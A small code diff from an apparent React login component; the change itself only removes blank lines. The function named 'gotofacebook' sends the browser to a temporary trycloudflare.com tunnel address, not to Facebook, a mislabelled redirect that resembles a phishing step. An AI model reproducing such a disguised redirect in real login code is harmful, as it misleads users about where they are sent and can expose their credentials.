@@ -16,9 +16,7 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-
     window.location.href = 'https://database-sun-federal-twice.trycloudflare.com';
-
   }
 
   const handleLogin = async (e) => {
